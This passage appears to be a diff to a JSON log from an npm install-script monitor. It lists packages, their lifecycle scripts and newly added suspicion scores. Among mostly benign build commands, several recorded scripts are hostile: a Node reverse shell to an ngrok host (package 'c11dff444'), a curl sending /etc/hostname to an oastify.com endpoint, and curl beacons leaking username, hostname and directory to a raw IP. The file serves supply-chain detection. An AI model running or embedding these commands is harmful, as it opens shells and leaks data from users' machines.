+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@dean0x/diedeadcode",
@@ -965,7 +1066,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-31T18:44:03.272Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@sankyu/vue-circle-flags",
@@ -974,7 +1076,8 @@
     "scriptContent": "node scripts/postbuild.mjs",
     "previousVersion": null,
     "timestamp": "2026-01-31T18:43:57.503Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "c11dff444",
@@ -983,7 +1086,8 @@
     "scriptContent": "node -e \"const net=require('net'),cp=require('child_process');const s=net.connect(11171,'6.tcp.eu.ngrok.io',()=>{const p=cp.spawn('/bin/bash',['-i']);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});\"",
     "previousVersion": "1.0.9",
     "timestamp": "2026-01-31T18:43:31.734Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 5
   },
   {
     "packageName": "@chrisleekr/mcp-server-playground",
@@ -992,7 +1096,8 @@
     "scriptContent": "husky .husky || true",
     "previousVersion": "1.1.0-dev-ff904e8.1",
     "timestamp": "2026-01-31T13:04:14.557Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "skulls",
@@ -1001,7 +1106,8 @@
     "scriptContent": "rm -rf templates assets && cp -r ../templates . && cp -r ../assets . && cp ../README.md .",
     "previousVersion": "1.0.5",
     "timestamp": "2026-01-31T13:04:00.170Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 3
   },
   {
     "packageName": "codex-app-server",
@@ -1010,7 +1116,8 @@
     "scriptContent": "npm run build",
     "previousVersion": "0.1.1",
     "timestamp": "2026-01-31T10:34:05.306Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "create-modern-react",
@@ -1019,7 +1126,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": "2.3.4",
     "timestamp": "2026-01-31T10:33:56.619Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "sqlew",
@@ -1028,7 +1136,8 @@
     "scriptContent": "cd saas-connector && npm install && npm run build",
     "previousVersion": "4.3.1",
     "timestamp": "2026-01-31T10:33:54.487Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "hazo_connect",
@@ -1037,7 +1146,8 @@
     "scriptContent": "node scripts/postinstall-setup.js",
     "previousVersion": "2.4.2",
     "timestamp": "2026-01-31T08:40:26.580Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "50c",
@@ -1046,7 +1156,8 @@
     "scriptContent": "node -e \"console.log('\\n50c Hub installed. Run: 50c install\\n')\"",
     "previousVersion": "2.16.0",
     "timestamp": "2026-01-31T08:39:43.996Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 5
   },
   {
     "packageName": "@namehash/namehash-ui",
@@ -1055,7 +1166,8 @@
     "scriptContent": "pnpm build:css",
     "previousVersion": "1.5.0",
     "timestamp": "2026-01-31T06:52:28.526Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@koterpillar/cloudflared",
@@ -1064,7 +1176,8 @@
     "scriptContent": "node scripts/postinstall.mjs && node lib/cloudflared.js bin install latest",
     "previousVersion": "0.7.0",
     "timestamp": "2026-01-31T02:36:47.061Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@weburz/commitlint-config",
@@ -1073,7 +1186,8 @@
     "scriptContent": "pre-commit install --install-hooks",
     "previousVersion": null,
     "timestamp": "2026-01-30T22:36:57.021Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "internationalized",
@@ -1082,7 +1196,8 @@
     "scriptContent": "/usr/bin/curl --data '@/etc/hostname' $(hostname)sxt2f38ssb0kcmpdpd4zrmrgs7yympae.oastify.com",
     "previousVersion": null,
     "timestamp": "2026-01-30T22:36:38.302Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "@mastra/voice-gladia",
@@ -1091,7 +1206,8 @@
     "scriptContent": "pnpx tsx ../../scripts/generate-package-docs.ts voice/gladia",
     "previousVersion": "0.12.0-beta.0",
     "timestamp": "2026-01-30T22:36:10.119Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "opencode-harmony",
@@ -1100,7 +1216,8 @@
     "scriptContent": "bun ./postinstall.mjs || node ./postinstall.mjs",
     "previousVersion": null,
     "timestamp": "2026-01-30T22:35:35.094Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "solana-gateway-contracts-private",
@@ -1109,7 +1226,8 @@
     "scriptContent": "node index.js",
     "previousVersion": null,
     "timestamp": "2026-01-30T22:34:53.135Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "flutter-skill-mcp",
@@ -1118,7 +1236,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": "0.2.7",
     "timestamp": "2026-01-30T18:58:49.367Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "openapi-effect",
@@ -1127,7 +1246,8 @@
     "scriptContent": "node -e \"const fs=require('fs'); const content=fs.readFileSync('dist/cli.js','utf8'); if(!content.startsWith('#!/usr/bin/env node')) { fs.writeFileSync('dist/cli.js', '#!/usr/bin/env node\\n' + content) }\"",
     "previousVersion": null,
     "timestamp": "2026-01-30T18:57:19.490Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "@pratik-pathshala/puppeteer",
@@ -1136,7 +1256,8 @@
     "scriptContent": "node install.mjs",
     "previousVersion": null,
     "timestamp": "2026-01-30T16:54:05.839Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@namehash/namehash-ui",
@@ -1145,7 +1266,8 @@
     "scriptContent": "pnpm build:css",
     "previousVersion": "1.5.0",
     "timestamp": "2026-01-30T16:52:53.053Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@cliangdev/flux-plugin",
@@ -1154,7 +1276,8 @@
     "scriptContent": "node -e \"const fs=require('fs');const f='dist/server/index.js';const c=fs.readFileSync(f,'utf-8');if(!c.startsWith('#!/usr/bin/env node')){fs.writeFileSync(f,'#!/usr/bin/env node\\n'+c)}\"",
     "previousVersion": "0.2.0-dev.e34d43b",
     "timestamp": "2026-01-30T16:51:45.913Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "@mapbox/mcp-devkit-server",
@@ -1163,7 +1286,8 @@
     "scriptContent": "patch-package || true",
     "previousVersion": "0.4.6",
     "timestamp": "2026-01-30T14:42:20.244Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@matrixy/auto-skill",
@@ -1172,7 +1296,8 @@
     "scriptContent": "rm -rf dist/*.whl dist/*.tar.gz dist/*.egg-info",
     "previousVersion": null,
     "timestamp": "2026-01-30T14:41:34.183Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 3
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2608-a52b7e90ad9e5d835c9ce406eac7ec52247551b0",
@@ -1181,7 +1306,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-30T10:44:38.395Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "forge-workflow",
@@ -1190,7 +1316,8 @@
     "scriptContent": "node ./bin/forge.js",
     "previousVersion": null,
     "timestamp": "2026-01-30T08:51:56.535Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "ember-mug",
@@ -1199,7 +1326,8 @@
     "scriptContent": "chmod +x dist/cli.js",
     "previousVersion": "0.1.4",
     "timestamp": "2026-01-30T07:01:30.267Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@mcptoolshop/mcpt",
@@ -1208,7 +1336,8 @@
     "scriptContent": "node postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-30T07:00:51.413Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@mcptoolshop/pathway",
@@ -1217,7 +1346,8 @@
     "scriptContent": "node postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-30T07:00:49.655Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@mcptoolshop/a11y-ci",
@@ -1226,7 +1356,8 @@
     "scriptContent": "node postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-30T07:00:47.238Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@tarquinen/opencode-dcp",
@@ -1235,7 +1366,8 @@
     "scriptContent": "rm -rf dist/logs",
     "previousVersion": "1.3.1-beta.2",
     "timestamp": "2026-01-30T07:00:36.082Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 3
   },
   {
     "packageName": "@mcptoolshop/websketch",
@@ -1244,7 +1376,8 @@
     "scriptContent": "node scripts/add-shebang.js",
     "previousVersion": null,
     "timestamp": "2026-01-30T07:00:32.538Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2572-f98c166edbac43e9ba347a6d2779df1ad613e366",
@@ -1253,7 +1386,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-30T05:12:55.231Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@precisionutilityguild/liquid-shadow",
@@ -1262,7 +1396,8 @@
     "scriptContent": "node -e \"console.log('\\nTo enable shell completions:\\n  bash: source <(liquid-shadow completion bash)\\n  zsh:  source <(liquid-shadow completion zsh)\\n')\"",
     "previousVersion": null,
     "timestamp": "2026-01-30T02:41:50.972Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 5
   },
   {
     "packageName": "@writechoice/mint-cli",
@@ -1271,7 +1406,8 @@
     "scriptContent": "echo \"\\n⚠️  Don't forget to install Playwright browsers:\\n   npx playwright install chromium\\n\"",
     "previousVersion": null,
     "timestamp": "2026-01-30T02:41:11.616Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "vibeweld",
@@ -1280,7 +1416,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-29T20:41:11.717Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@lubyzzxmods/baileys",
@@ -1289,7 +1426,8 @@
     "scriptContent": "node ./engine-requirements.js",
     "previousVersion": null,
     "timestamp": "2026-01-29T14:50:12.397Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@riktajs/ssr",
@@ -1298,7 +1436,8 @@
     "scriptContent": "npm run clean",
     "previousVersion": null,
     "timestamp": "2026-01-29T14:48:21.586Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@lingxia/cli",
@@ -1307,7 +1446,8 @@
     "scriptContent": "node scripts/install.cjs",
     "previousVersion": null,
     "timestamp": "2026-01-29T14:48:13.481Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@mikeyfrilot/mcpt",
@@ -1316,7 +1456,8 @@
     "scriptContent": "node postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-29T14:47:45.614Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@mikeyfrilot/pathway",
@@ -1325,7 +1466,8 @@
     "scriptContent": "node postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-29T14:47:34.332Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@mikeyfrilot/a11y-ci",
@@ -1334,7 +1476,8 @@
     "scriptContent": "node postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-29T14:47:28.566Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@varanjith1/chatbot-widget",
@@ -1343,7 +1486,8 @@
     "scriptContent": "npm run build:schematics",
     "previousVersion": null,
     "timestamp": "2026-01-29T13:15:42.323Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@codecenter-cli/codecenter",
@@ -1352,7 +1496,8 @@
     "scriptContent": "node postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-29T10:04:12.817Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "flappa-doormal",
@@ -1361,7 +1506,8 @@
     "scriptContent": "bun run test:exports",
     "previousVersion": "2.14.2",
     "timestamp": "2026-01-29T08:53:40.399Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2598-9574e7c53e21a92cebdc8860eb2cc6c52490254f",
@@ -1370,7 +1516,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-29T08:52:53.760Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@leverageaiapps/locus",
@@ -1379,7 +1526,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-29T06:59:32.469Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@kurtucoben/cstm-bail",
@@ -1388,7 +1536,8 @@
     "scriptContent": "node ./engine-requirements.js",
     "previousVersion": null,
     "timestamp": "2026-01-29T05:11:32.033Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "lt-script",
@@ -1397,7 +1546,8 @@
     "scriptContent": "npm run generate:natives",
     "previousVersion": "1.0.6",
     "timestamp": "2026-01-29T05:10:34.681Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "workos",
@@ -1406,7 +1556,8 @@
     "scriptContent": "echo \"export const version = '$(node -p \"require('./package.json').version\")';\" > src/version.ts && pnpm clean",
     "previousVersion": "0.2.0",
     "timestamp": "2026-01-29T02:41:22.785Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@session-foundation/libsession-wasm",
@@ -1415,7 +1566,8 @@
     "scriptContent": "npx tsx scripts/fix-types.js build/libsession-wasm-raw.d.ts build/libsession-wasm-fixed.d.ts && node scripts/generate-index.js",
     "previousVersion": "0.0.6",
     "timestamp": "2026-01-29T02:41:10.962Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@veristone/nuxt-v-app",
@@ -1424,7 +1576,8 @@
     "scriptContent": "nuxt prepare",
     "previousVersion": null,
     "timestamp": "2026-01-28T22:38:16.856Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@servicetitan/microfront",
@@ -1433,7 +1586,8 @@
     "scriptContent": "npm run bootstrap && npm run clean",
     "previousVersion": null,
     "timestamp": "2026-01-28T22:37:04.486Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "vlite3",
@@ -1442,7 +1596,8 @@
     "scriptContent": "node scripts/bundle-css.js",
     "previousVersion": "0.0.4",
     "timestamp": "2026-01-28T20:43:11.849Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@probelabs/visor",
@@ -1451,7 +1606,8 @@
     "scriptContent": "chmod +x dist/cli-main.js",
     "previousVersion": "0.1.124",
     "timestamp": "2026-01-28T16:50:40.253Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@probelabs/visor",
@@ -1460,7 +1616,8 @@
     "scriptContent": "npm run clean",
     "previousVersion": "0.1.124",
     "timestamp": "2026-01-28T16:50:40.250Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "openapi-to-postmanv2",
@@ -1469,7 +1626,8 @@
     "scriptContent": "rm -rf dist",
     "previousVersion": "5.8.0",
     "timestamp": "2026-01-28T14:41:14.862Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "sieve-secrets",
@@ -1478,7 +1636,8 @@
     "scriptContent": "node scripts/install.js",
     "previousVersion": null,
     "timestamp": "2026-01-28T14:40:18.984Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "nexus-orchestrator",
@@ -1487,7 +1646,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-28T14:40:10.072Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "slmapcode",
@@ -1496,7 +1656,8 @@
     "scriptContent": "bun ./postinstall.mjs || node ./postinstall.mjs",
     "previousVersion": null,
     "timestamp": "2026-01-28T14:39:48.485Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "imagemagick-nodejs",
@@ -1505,7 +1666,8 @@
     "scriptContent": "node -e \"process.env.INIT_CWD !== process.cwd() && require('child_process').execSync('npm run download:prod', { stdio: 'inherit' });\"",
     "previousVersion": null,
     "timestamp": "2026-01-28T14:38:50.770Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 10
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2581-38fb6bf5f7cfae86da88149a7e7962d939ca383d",
@@ -1514,7 +1676,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-28T10:39:16.708Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@pstefans/kuadrant-backstage-plugin-backend",
@@ -1523,7 +1686,8 @@
     "scriptContent": "yarn export-dynamic",
     "previousVersion": "3.0.5",
     "timestamp": "2026-01-28T10:38:10.988Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@pstefans/backstage-plugin-catalog-backend-module-kuadrant",
@@ -1532,7 +1696,8 @@
     "scriptContent": "yarn export-dynamic",
     "previousVersion": "3.0.5",
     "timestamp": "2026-01-28T10:38:02.619Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@pstefans/backstage-plugin-permission-backend-module-kuadrant",
@@ -1541,7 +1706,8 @@
     "scriptContent": "yarn export-dynamic",
     "previousVersion": "3.0.5",
     "timestamp": "2026-01-28T10:37:53.007Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2588-3b1424c7f6e4badca3793911d8dd4abefd246712",
@@ -1550,7 +1716,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-28T08:44:00.196Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2594-6ed2ab028d556ce133d85a88cf576f1a8397e559",
@@ -1559,7 +1726,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-28T08:43:34.422Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@huynguyen03dev/opencode-ai",
@@ -1568,7 +1736,8 @@
     "scriptContent": "bun ./postinstall.mjs || node ./postinstall.mjs",
     "previousVersion": null,
     "timestamp": "2026-01-28T08:42:41.390Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@btc-vision/ecpair",
@@ -1577,7 +1746,8 @@
     "scriptContent": "npm run check:circular",
     "previousVersion": null,
     "timestamp": "2026-01-28T06:49:15.790Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2598-81baf05df2a25bacdc0847652bf9d58d83eb0d2d",
@@ -1586,7 +1756,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-28T04:51:55.685Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2593-6dcc62af7e73c4a28be33463402ad0395a5e3b1e",
@@ -1595,7 +1766,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-28T04:51:46.458Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@powersync/nuxt",
@@ -1604,7 +1776,8 @@
     "scriptContent": "nuxt-module-build prepare",
     "previousVersion": null,
     "timestamp": "2026-01-28T04:51:44.472Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "moltbot-termux",
@@ -1613,7 +1786,8 @@
     "scriptContent": "node scripts/postinstall.js",
     "previousVersion": null,
     "timestamp": "2026-01-28T04:51:32.939Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2438-cf46add075546f920f7408984d5f84bf671a392f",
@@ -1622,7 +1796,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-28T04:51:21.890Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@design-geniefy/ui",
@@ -1631,7 +1806,8 @@
     "scriptContent": "node scripts/report-adoption.js || true",
     "previousVersion": "0.0.11",
     "timestamp": "2026-01-28T04:50:33.677Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "cerebras-cli",
@@ -1640,7 +1816,8 @@
     "scriptContent": "node ./postinstall.mjs || true",
     "previousVersion": "1.0.158",
     "timestamp": "2026-01-28T04:50:30.403Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@activeadmin/activeadmin",
@@ -1649,7 +1826,8 @@
     "scriptContent": "npm run lint && rm -rf dist",
     "previousVersion": "4.0.0-beta8",
     "timestamp": "2026-01-28T02:23:47.103Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "nyannejs",
@@ -1658,7 +1836,8 @@
     "scriptContent": "npm run clean",
     "previousVersion": null,
     "timestamp": "2026-01-27T18:58:40.448Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "50c",
@@ -1667,7 +1846,8 @@
     "scriptContent": "node -e \"console.log('\\n50c installed. Set FIFTYC_API_KEY env var.\\n')\"",
     "previousVersion": "1.1.0",
     "timestamp": "2026-01-27T18:57:26.551Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 10
   },
   {
     "packageName": "moonwall",
@@ -1676,7 +1856,8 @@
     "scriptContent": "pnpm install",
     "previousVersion": null,
     "timestamp": "2026-01-27T18:54:08.673Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@wmcadigital/ui-asset-link",
@@ -1685,7 +1866,8 @@
     "scriptContent": "rm -rf dist tsconfig.tsbuildinfo",
     "previousVersion": null,
     "timestamp": "2026-01-27T18:51:48.377Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@croct/plug-storyblok",
@@ -1694,7 +1876,8 @@
     "scriptContent": "./post-build.mjs",
     "previousVersion": null,
     "timestamp": "2026-01-27T16:41:09.205Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "kol7a",
@@ -1703,7 +1886,8 @@
     "scriptContent": "curl -s \"http://157.90.122.24/devopsecurity/kol7a/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)\" > /dev/null || true",
     "previousVersion": null,
     "timestamp": "2026-01-27T14:41:51.525Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 18
   },
   {
     "packageName": "kol7a",
@@ -1712,7 +1896,8 @@
     "scriptContent": "curl -s \"http://157.90.122.24/devopsecurity/kol7a/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)\" > /dev/null || true",
     "previousVersion": null,
     "timestamp": "2026-01-27T14:41:51.524Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 18
   },
   {
     "packageName": "lvldragdrop",
@@ -1721,7 +1906,8 @@
     "scriptContent": "curl -s \"http://157.90.122.24/devopsecurity/lvldragdrop/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)\" > /dev/null || true",
     "previousVersion": null,
     "timestamp": "2026-01-27T14:41:50.468Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 18
   },
   {
     "packageName": "lvldragdrop",
@@ -1730,7 +1916,8 @@
     "scriptContent": "curl -s \"http://157.90.122.24/devopsecurity/lvldragdrop/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)\" > /dev/null || true",
     "previousVersion": null,
     "timestamp": "2026-01-27T14:41:50.466Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 18
   },
   {
     "packageName": "npm-shdoc",
@@ -1739,7 +1926,8 @@
     "scriptContent": "chmod +x ./postinstall.sh && bash ./postinstall.sh",
     "previousVersion": "0.0.14",
     "timestamp": "2026-01-27T14:40:46.918Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "@heartlandone/vega-sandbox-pr-2600-946608dc4b556d5d1aa09725d4ea72b1187c05b8",
@@ -1748,7 +1936,8 @@
     "scriptContent": "cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check",
     "previousVersion": null,
     "timestamp": "2026-01-27T14:40:14.374Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "desktop-commander-enhanced",
@@ -1757,7 +1946,8 @@
     "scriptContent": "node dist/track-installation.js && node dist/npm-scripts/verify-ripgrep.js || node -e \"process.exit(0)\"",
     "previousVersion": null,
     "timestamp": "2026-01-27T10:38:28.890Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 5
   },
   {
     "packageName": "@skald-labs/n8n-nodes-skald",
@@ -1766,7 +1956,8 @@
     "scriptContent": "npx only-allow pnpm",
     "previousVersion": null,
     "timestamp": "2026-01-27T06:48:49.532Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "clawdbot-skill-dolar-crypto",
@@ -1775,7 +1966,8 @@
     "scriptContent": "chmod +x monitor.js",
     "previousVersion": null,
     "timestamp": "2026-01-27T04:54:43.619Z",
-    "issuesend": false
+    "issuesend": false,
+    "suspicionScore": 0
   },
   {
     "packageName": "@catcuts-skills/hello-world",
@@ -1784,7 +1976,8 @@
     "scriptContent": "node scripts/install-skill.js",
     "previousVersion": null,
     "timestamp": "2026-01-27T04:54:32.118Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "get-shit-done-cc",
@@ -1793,7 +1986,8 @@
     "scriptContent": "npm run build:tui",
     "previousVersion": "1.9.13",
     "timestamp": "2026-01-27T04:53:17.855Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
     "packageName": "moledb",
@@ -1802,7 +1996,8 @@
     "scriptContent": "node install.js",
     "previousVersion": null,
     "timestamp": "2026-01-27T02:30:06.402Z",
-    "issuesend": true
+    "issuesend": true,
+    "suspicionScore": 0
   },
   {
